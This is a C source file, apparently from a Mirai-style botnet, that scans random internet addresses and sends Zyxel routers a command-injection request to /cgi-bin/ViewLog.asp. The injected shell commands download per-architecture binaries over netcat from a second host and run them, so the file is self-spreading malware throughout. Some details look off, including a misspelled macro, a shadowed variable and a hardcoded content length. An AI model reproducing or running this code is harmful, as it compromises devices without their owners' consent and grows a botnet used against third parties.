#include "includes.h"
#include "selfrep_zyxel.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

#define ZYXEL_SCANNER_MAX_CONNS 256
#define ZYXEL_SCANNER_PORT 8080

struct zyxel_conn { int fd; ipv4_t dst_addr; time_t last_recv; };
static struct zyxel_conn conns[ZYXEL_SCANNER_MAX_CONNS];
static ipv4_t get_random_ip_zyxel(void);
static void zyxel_connect(struct zyxel_conn *);
static void zyxel_close(struct zyxel_conn *);

void zyxel_scanner_init(void) {
    if (fork() == 0) {
        int i;
        for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) conns[i].fd = -1;
        while (TRUE) {
            fd_set fdset; struct timeval tv; int maxfd = 0;
            FD_ZERO(&fdset);
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1) { FD_SET(conns[i].fd, &fdset); if (conns[i].fd > maxfd) maxfd = conns[i].fd; }
            }
            tv.tv_sec = 1; tv.tv_usec = 0;
            select(maxfd + 1, &fdset, NULL, NULL, &tv);
            time_t now = time(NULL);
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++)
                if (conns[i].fd != -1 && now - conns[i].last_recv > 10) zyxel_close(&conns[i]);
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fdset)) {
                    char buf[4096]; int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    if (n <= 0) zyxel_close(&conns[i]); else conns[i].last_recv = now;
                }
            }
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd == -1) { conns[i].dst_addr = get_random_ip_zyxel(); zyxel_connect(&conns[i]); break; }
            }
            sleep(1);
        }
    }
}

static ipv4_t get_random_ip_zyxel(void) {
    ipv4_t addr;
    while (TRUE) {
        addr = rand_next();
        uint8_t f = (addr >> 24) & 0xFF;
        if (f >= 100 && f <= 223) break;
    }
    return addr;
}

static void zyxel_connect(struct zyxel_conn *conn) {
    struct sockaddr_in addr;
    char payload[1024];
    ipv4_t seed = rand_next();
    ipv4_t local = util_local_addr();
    conn->fd = socket(AF_INET, SOCK_STREAM, 0); if (conn->fd == -1) return;
    fcntl(conn->fd, F_SETFL, O_NONBLOCK);
    addr.sin_family = AF_INET; addr.sin_addr.s_addr = conn->dst_addr; addr.sin_port = htons(ZYXEL_SCANNER_PORT);
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == 0 || errno == EINPROGRESS) {
        ipv4_t seed = rand_next();
        snprintf(payload, sizeof(payload),
            "POST /cgi-bin/ViewLog.asp HTTP/1.1\r\n"
            "Host: %d.%d.%d.%d\r\n"
            "Content-Length: 400\r\n\r\n"
            "start_time=123456&end_time=123457&"
            "cd /tmp;for arch in arm mips mpsl x86 arm7 x86_64 ppc spc;do rm -f axis.$arch;for c in 0 1 2 3 4 5 6 7;do printf '\\040\\000\\000$arch' | nc -u -w1 %d.%d.%d.%d 49153 >> axis.$arch;done;chmod +x axis.$arch;done;for arch in arm mips mpsl x86 arm7 x86_64 ppc spc;do test -s axis.$arch && ./axis.$arch & done",
            (conn->dst_addr >> 24) & 0xFF, (conn->dst_addr >> 16) & 0xFF,
            (conn->dst_addr >> 8) & 0xFF, conn->dst_addr & 0xFF,
            LOCAAL_ADDR(seed), LOCAAL_ADDR_1(seed),
            LOCAAL_ADDR_2(seed), LOCAAL_ADDR_3(seed));
        send(conn->fd, payload, strlen(payload), 0);
        conn->last_recv = time(NULL);
    } else { close(conn->fd); conn->fd = -1; }
}

static void zyxel_close(struct zyxel_conn *conn) { if (conn->fd != -1) { close(conn->fd); conn->fd = -1; } }

#endif
